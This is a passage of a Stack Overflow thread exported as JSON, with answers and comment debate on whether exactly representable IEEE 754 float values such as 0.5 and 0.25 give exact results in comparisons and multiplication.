417292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d3520ad50fa42c9319830bd9f0900c5d?s=128&d=identicon&r=PG", "display_name": "jcoder", "link": "https://stackoverflow.com/users/417292/jcoder"}, "edited": false, "score": 7, "creation_date": 1447229025, "post_id": 33646148, "comment_id": 55066176, "body": "Yes, floating point is not some vague thing that gives approximate answers. The issues with floating point are about representation of decimal numbers and precision issues. There is nothing &quot;fuzzy&quot; about the actual operations themselves. (Just be really really sure that you are doing it right though, I&#39;d be very cautious about it anyway as code that works today for this might not tomorrow when someone changes 0.25 in some code to 0.1 not realizing it matters)"}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "reply_to_user": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 8, "creation_date": 1447229125, "post_id": 33646148, "comment_id": 55066215, "body": "@bolov How so? Why shouldn&#39;t 0.125 always be expressed as 2^-3? The hassle begins only as soon as you throw in a number which is not expressible exactly. And 5 * 0.1 might not be 0.5. But, as said, as long as you stay within the range of exactly expressible numbers, it should be safe. The problem is to recognize whan you leave this range - and thus, it is better to stay on the safe side."}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1447229186, "post_id": 33646148, "comment_id": 55066240, "body": "It&#39;s a bit complicated, but yes, <i>some</i> numbers, such as 0.5 and 0.25, and all small integers, can be exactly represented using binary floating-point numbers. It&#39;s just that not all of them can. For details, this text is usually recommended: <a href=\"http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html\" rel=\"nofollow noreferrer\">docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html</a>"}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "reply_to_user": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1447229362, "post_id": 33646148, "comment_id": 55066306, "body": "@ThomasPadron-McCarthy And exactly these are what the question is about."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1447229460, "post_id": 33646148, "comment_id": 55066338, "body": "Always helpful <a href=\"http://floating-point-gui.de/\" rel=\"nofollow noreferrer\"><b>The Floating-Point Guide - What Every Programmer Should Know ...</b></a>"}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "reply_to_user": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 1, "creation_date": 1447229470, "post_id": 33646148, "comment_id": 55066344, "body": "@glglgl: Yes, I agree. And, just to be clear, this question is <i>not</i> a duplicate of the usual &quot;why doesn&#39;t floating point work&quot;."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 3, "creation_date": 1447229561, "post_id": 33646148, "comment_id": 55066382, "body": "<code>a=123</code> and <code>b=0.25</code> so <i>&quot;is a * b always 61.5?&quot;</i> No, because it&#39;s 30.75. And there&#39;s your answer. Human error guarantees that some value that you think should be exactly representable in IEEE-754 actually won&#39;t be. So you should never write code that requires values to be exactly representable in IEEE-754."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1447229734, "post_id": 33646148, "comment_id": 55066448, "body": "It is a limitation of the 23-bit mantissa, the reduces the pool of numbers that can be represented exactly in 32-bit floating point. (In other words, you don&#39;t have all 32-bits to describe all 32-bit numbers...)"}, {"owner": {"reputation": 1090, "user_id": 533468, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/46416700a9b6dc1e56839071b2206d7f?s=128&d=identicon&r=PG&f=1", "display_name": "Mahmut Ali &#214;ZKURAN", "link": "https://stackoverflow.com/users/533468/mahmut-ali-%c3%96zkuran"}, "edited": false, "score": 0, "creation_date": 1447230254, "post_id": 33646148, "comment_id": 55066688, "body": "Actually with every deploy some function get rid of floating points."}, {"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 2, "creation_date": 1447230699, "post_id": 33646148, "comment_id": 55066880, "body": "@amuse As you can see, this is a topic where many people have a dangerously incomplete knowledge, but think they&#39;re experts (two deleted heavily downvoted answers already, and the comments everywhere...). I&#39;m not saying someone here is right or wrong, just that out of many conflicting statements, only one can be true ... and it&#39;s the same over the whole internet. So, please, take <i>everything</i> with a grain of salt, don&#39;t just immediately believe what someone wrote."}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1447231845, "post_id": 33646148, "comment_id": 55067414, "body": "@DavidC.Rankin - on the contrary, that oft-cited paper is almost never helpful..."}, {"owner": {"reputation": 75299, "user_id": 139746, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/BhJLC.png?s=128&g=1", "display_name": "Pascal Cuoq", "link": "https://stackoverflow.com/users/139746/pascal-cuoq"}, "reply_to_user": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 2, "creation_date": 1447243850, "post_id": 33646148, "comment_id": 55073926, "body": "@bolov You are so wrong."}], "answers": [{"tags": [], "owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "is_accepted": false, "score": 0, "last_activity_date": 1447229478, "creation_date": 1447229478, "answer_id": 33646491, "question_id": 33646148, "link": "https://stackoverflow.com/questions/33646148/is-hardcode-float-precise-if-it-can-be-represented-by-binary-format-in-ieee-754/33646491#33646491", "title": "Is hardcode float precise if it can be represented by binary format in IEEE 754?", "body": "<p>In principle, this should be possible. If you restrict yourself to exactly this class of numbers with a finite 2-power representation.</p>\n\n<p>But it is dangerous: what if someone takes your code and changes your <code>0.5</code> to <code>0.4</code> or your <code>.0625</code> to <code>.065</code> due to whatever reasons? Then your code is broken. And no, even excessive comments won't help about that - someone will always ignore them.</p>\n"}, {"comments": [{"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 0, "creation_date": 1447229701, "post_id": 33646508, "comment_id": 55066436, "body": "Indeed, it <i>is</i> a fixed-with representation, but not a decimal one, but a binary one."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447229801, "post_id": 33646508, "comment_id": 55066480, "body": "This is incorrect. Floating point math, even between only perfectly representable numbers, is not accurate and will not yield the exact same results on different processors. This phenomenon, btw, is why in game development in client/server real time syncing you need a bunch of resync packets and tolerances."}, {"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 5, "creation_date": 1447229959, "post_id": 33646508, "comment_id": 55066567, "body": "@Magisch Sorry, but you are just wrong. If all mentionned processors use IEEE 754 AND the numbers are finite in binary representation, there is just no reason to provide different results. As soon as rounding is involved, there MIGHT be some differences, but not earlier."}, {"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 1, "creation_date": 1447229997, "post_id": 33646508, "comment_id": 55066580, "body": "@Magisch What has net serialization to do with math? What has everything here to do with realtime? It sounds very much like you just don&#39;t want to be wrong. And we&#39;re talking about IEEE754 only here. While it has some things where one possibility out of multiple can be chosen, theres nothing undefined or random in it."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "reply_to_user": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1447230075, "post_id": 33646508, "comment_id": 55066613, "body": "@deviantfan as soon as you have a math operation where one even temporary result has a number not directly finitely represented in floating point math, it will be inaccurate. Thats almost unavoidable, given how multiplication and division are implemented. Its further completely unavoidable when you use something like <code>pow</code>"}, {"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 2, "creation_date": 1447230115, "post_id": 33646508, "comment_id": 55066637, "body": "@Magisch Let me ask again, what has fp math to do with fp serialization and realtime scenarios? If this ic clear, we can continue."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "reply_to_user": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1447230134, "post_id": 33646508, "comment_id": 55066645, "body": "@deviantfan op is asking about results of FP math. So the answer is either incorrect or not adressing the question. Bad either way."}, {"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 3, "creation_date": 1447230169, "post_id": 33646508, "comment_id": 55066655, "body": "@Magisch And your comment was about something completely unrelated. That&#39;s why I&#39;m asking"}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "reply_to_user": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1447230222, "post_id": 33646508, "comment_id": 55066677, "body": "@deviantfan In game development (my example) fp math is heavily used to calc vectors and positions and coordinates. That gets inaccurate real quick and errors might compound, resulting in desync. Maybe it wasn&#39;t a good example, but the point stands."}, {"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 4, "creation_date": 1447230309, "post_id": 33646508, "comment_id": 55066721, "body": "And about <code>as soon as you have a math operation where one even temporary result has a number not directly finitely represented in floating point math, it will be inaccurate.</code> Ok, but <i>unrepresentable numbers are not what everyone here is talking about</i>."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "reply_to_user": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 0, "creation_date": 1447230603, "post_id": 33646508, "comment_id": 55066851, "body": "@deviantfan the answer is not adressing those particular. The numbers in the question are not all finitely representable, at least from what I see."}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1447231235, "post_id": 33646508, "comment_id": 55067123, "body": "Thanks for many useful comments. I&#39;m trying to incorporate some of it in my answer."}], "tags": [], "owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "is_accepted": true, "score": 7, "last_activity_date": 1447231128, "last_edit_date": 1447231128, "creation_date": 1447229567, "answer_id": 33646508, "question_id": 33646148, "link": "https://stackoverflow.com/questions/33646148/is-hardcode-float-precise-if-it-can-be-represented-by-binary-format-in-ieee-754/33646508#33646508", "title": "Is hardcode float precise if it can be represented by binary format in IEEE 754?", "body": "<p>There is no inherent fuzzyness in floating-point numbers. It's just that some, but not all, real numbers can't be exactly represented.</p>\n\n<p>Compare with a fixed-width decimal representation, let's say with three digits. The integer 1 can be represented, using 1.00, and 1/10 can be represented, using 0.10, but 1/3 can only be approximated, using 0.33.</p>\n\n<p>If we instead use binary digits, the integer 1 would be represented as 1.00 (binary digits), 1/2 as 0.10, 1/4 as 0.01, but 1/3 can (again) only be approximated.</p>\n\n<p>There are some things to remember, though:</p>\n\n<ul>\n<li>It's not the <em>same</em> numbers as with decimal digits. 1/10 can be\nwritten exactly as 0.1 using decimal digits, but not using binary\ndigits, no matter how many you use (short of infinity).</li>\n<li>In practice, it is difficult to keep track of which numbers can be<br>\nrepresented and which can't. 0.5 can, but 0.4 can't. So when you need\nexact numbers, such as (often) when working with money, you shouldn't\nuse floating-point numbers.</li>\n<li>According to some sources, some processors do strange things\ninternally when performing floating-point calculations on numbers\nthat can't be exactly represented, causing results to vary in a way\nthat is, in practice, unpredictable.</li>\n</ul>\n\n<p>(My opinion is that it's actually a reasonable first approximation to say that yes, floating-point numbers <em>are</em> inherently fuzzy, so unless you are sure your particular application can handle that, stay away from them.)</p>\n\n<p>For more details than you probably need or want, read the famous <a href=\"http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html\" rel=\"nofollow\">What Every Computer Scientist Should Know About Floating-Point Arithmetic</a>. Also, this somewhat more accessible website: <a href=\"http://floating-point-gui.de/\" rel=\"nofollow\">The Floating-Point Guide</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 15219, "user_id": 342, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/becdc810f976b0b4fb2ecd4a4c9f8bd6?s=128&d=identicon&r=PG", "display_name": "graham.reeds", "link": "https://stackoverflow.com/users/342/graham-reeds"}, "is_accepted": false, "score": 2, "last_activity_date": 1447229620, "creation_date": 1447229620, "answer_id": 33646520, "question_id": 33646148, "link": "https://stackoverflow.com/questions/33646148/is-hardcode-float-precise-if-it-can-be-represented-by-binary-format-in-ieee-754/33646520#33646520", "title": "Is hardcode float precise if it can be represented by binary format in IEEE 754?", "body": "<p>No, but as Thomas Padron-McCarthy says, some numbers can be exactly represented using binary but not all of them can.</p>\n\n<p>This is the way I explain it to non-developers who I work with (like Mahmut Ali I also work on an very old financial package): Imagine having a very large cake that is cut into 256 slices.  Now you can give 1 person the whole cake, 2 people half of the slices but soon as you decide to split it between 3 you can't - it's either 85 or 86 - you can't split the cake any further.  The same is with floating point.  You can only get exact numbers on some representations - some numbers can only be closely approximated.</p>\n"}, {"comments": [{"owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 2, "creation_date": 1447229846, "post_id": 33646555, "comment_id": 55066510, "body": "Right, but the question focuses explicitly on IEEE 754 representation."}, {"owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "reply_to_user": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 0, "creation_date": 1447230050, "post_id": 33646555, "comment_id": 55066601, "body": "@glglgl: I added a paragraph about that. Thanks."}, {"owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "reply_to_user": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "edited": false, "score": 0, "creation_date": 1447259401, "post_id": 33646555, "comment_id": 55083609, "body": "@anonymous downvoter: you&#39;ve downvoted out of ignorance. please explain your thinking so that it can be corrected. thank you."}, {"owner": {"reputation": 1902, "user_id": 21656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40f8d096a3777232204cb3f796c577b7?s=128&d=identicon&r=PG", "display_name": "George", "link": "https://stackoverflow.com/users/21656/george"}, "edited": false, "score": 0, "creation_date": 1447328847, "post_id": 33646555, "comment_id": 55114276, "body": "In C (C11, specifically), if I have a union of a float and an int, and I already know that sizeof(float) == sizeof(int), what happens if I write to the float, then read from the int? Are you saying I won&#39;t get a binary number back? C11 explicitly allows type punning here. See the accepted answer on  this question: <a href=\"http://stackoverflow.com/questions/11373203/accessing-inactive-union-member-undefined-behavior\" title=\"accessing inactive union member undefined behavior\">stackoverflow.com/questions/11373203/&hellip;</a>"}, {"owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "reply_to_user": {"reputation": 1902, "user_id": 21656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40f8d096a3777232204cb3f796c577b7?s=128&d=identicon&r=PG", "display_name": "George", "link": "https://stackoverflow.com/users/21656/george"}, "edited": false, "score": 0, "creation_date": 1447334335, "post_id": 33646555, "comment_id": 55117404, "body": "@George: Type punning has no relevance. So I&#39;m not sure what you&#39;re asking; it doesn&#39;t make sense to me, but I guess it&#39;s about possible decimal floating point representations. In C++ <code>numeric_limits&lt;T&gt;::radix()</code> gives you the radix for a specific floating point type <code>T</code>. In C++11 it&#39;s specified as equivalent to <code>FLT_RADIX</code> in C, and that implies that for C++11 and earlier it&#39;s the same for all floating point types in a given implementation, as it is in C. It&#39;s there because it&#39;s needed. There is a proposal for a guaranteed decimal type, and then the equivalence has to be dropped."}, {"owner": {"reputation": 1902, "user_id": 21656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40f8d096a3777232204cb3f796c577b7?s=128&d=identicon&r=PG", "display_name": "George", "link": "https://stackoverflow.com/users/21656/george"}, "edited": false, "score": 0, "creation_date": 1447360271, "post_id": 33646555, "comment_id": 55134541, "body": "@Cheers and hth. - Alf, the type punning part was relevant because I wanted to make clear that accessing the binary representation of a floating-point number through the other element of a union was legal in the example I was describing, so I wouldn&#39;t get yelled at by people for invoking undefined behavior. Also, even a guaranteed decimal type will still have some sort of binary representation."}, {"owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "reply_to_user": {"reputation": 1902, "user_id": 21656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40f8d096a3777232204cb3f796c577b7?s=128&d=identicon&r=PG", "display_name": "George", "link": "https://stackoverflow.com/users/21656/george"}, "edited": false, "score": 0, "creation_date": 1447361326, "post_id": 33646555, "comment_id": 55135134, "body": "@George: You are correct that C++ can only be effectively used on a binary machine, due to the requirement of binary built-in integral types. You are, I believe, wrong in assuming that readers are not aware of that. However, on the third &amp; gripping hand, it&#39;s not as obvious as it might seem. When Donald Knuth defined the MIX assembly language in his classic The Art of Computer Programming, he defined so that one couldn&#39;t readily tell whether the underlying hardware was binary or decimal. C++ could be effectively used on such a machine. Except that such machine has no advantage today. ;-)"}], "tags": [], "owner": {"reputation": 135186, "user_id": 464581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/v2PxU.jpg?s=128&g=1", "display_name": "Cheers and hth. - Alf", "link": "https://stackoverflow.com/users/464581/cheers-and-hth-alf"}, "is_accepted": false, "score": 1, "last_activity_date": 1447259511, "last_edit_date": 1447259511, "creation_date": 1447229789, "answer_id": 33646555, "question_id": 33646148, "link": "https://stackoverflow.com/questions/33646148/is-hardcode-float-precise-if-it-can-be-represented-by-binary-format-in-ieee-754/33646555#33646555", "title": "Is hardcode float precise if it can be represented by binary format in IEEE 754?", "body": "<p>C++ does not require binary floating point representation. Built-in integers are required to have a binary representation, commonly two's complement, but one's complement and sign and magnitude are also supported. But floating point can be e.g. decimal.</p>\n\n<p>This leaves open the question of whether C++ floating point can have a radix that does not have 2 as a prime factor, like 2 and 10. Are other radixes permitted? I don't know, and last time I tried to check that, I failed.</p>\n\n<p>However, <em>assuming</em> that the radix must be 2 or 10, then all your examples involve values that are powers of 2 and therefore can be exactly represented.</p>\n\n<p>This means that the single answer to most of your questions is &ldquo;yes&rdquo;. The exception is the question &ldquo;is integer multiply by IEEE 754 binary float [exact]&rdquo;. If the result exceeds the precision available, then it can't be exact, but otherwise it is.</p>\n\n<p>See the classic <a href=\"https://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html\" rel=\"nofollow\">&ldquo;What Every Computer Scientist Should Know About Floating-Point Arithmetic&rdquo;</a> for background info about floating point representation &amp; properties in general.</p>\n\n<hr>\n\n<p>If a value can be exactly represented in 32-bit or 64-bit IEEE 754, then that doesn't mean that it can be exactly represented with some other floating point representation. That's because different 32-bit representations and different 64-bit representations use different number of bits to hold the mantissa and have different exponent ranges. So a number that can be exactly represented in one way, can be beyond the precision or range of some other representation.</p>\n\n<hr>\n\n<p>You can use <code>std::numeric_limits&lt;T&gt;::is_iec559</code> (where e.g. <code>T</code> is <code>double</code>) to check whether your implementation claims to be IEEE 754 compatible. However, when floating point optimizations are turned on, at least the g++ compiler <sup>(1)</sup>erroneously claims to be IEEE 754, while not treating e.g. NaN values correctly according to that standard. In effect, the <code>is_iec559</code> only tells you whether the number <em>representation</em> is IEEE 754, and not whether the semantics conform.</p>\n\n<hr>\n\n<p><sup>\n<sup>(1)</sup> Essentially, instead of providing different <em>types</em> for different semantics, gcc and g++ try to accommodate different semantics via compiler options. And with separate compilation of parts of a program, that can't conform to the C++ standard.\n</sup></p>\n"}], "owner": {"reputation": 7341, "user_id": 4822120, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/cb73b37b475eb2c8c710875ac9d842ba?s=128&d=identicon&r=PG&f=1", "display_name": "ggrr", "link": "https://stackoverflow.com/users/4822120/ggrr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 924, "favorite_count": 2, "accepted_answer_id": 33646508, "answer_count": 4, "score": 9, "last_activity_date": 1447291971, "creation_date": 1447227892, "last_edit_date": 1447291971, "question_id": 33646148, "link": "https://stackoverflow.com/questions/33646148/is-hardcode-float-precise-if-it-can-be-represented-by-binary-format-in-ieee-754", "title": "Is hardcode float precise if it can be represented by binary format in IEEE 754?", "body": "<p>for example, 0 , 0.5, 0.15625 , 1 , 2 , 3... are values converted from IEEE 754. Are their hardcode version precise?</p>\n\n<p>for example:</p>\n\n<p>is </p>\n\n<pre><code>float a=0;\nif(a==0){\n    return true;\n}\n</code></pre>\n\n<p>always return true? other example:</p>\n\n<pre><code>float a=0.5;\nfloat b=0.25;\nfloat c=0.125;\n</code></pre>\n\n<p>is a * b always equal to 0.125 and a * b==c always true? And one more example:</p>\n\n<pre><code>int a=123;\nfloat b=0.5;\n</code></pre>\n\n<p>is a * b always be 61.5? or in general, is integer multiply by IEEE 754 binary float precise?</p>\n\n<p>Or a more general question: if the value is hardcode and both the value and result can be represented by binary format in IEEE 754 (e.g.:0.5 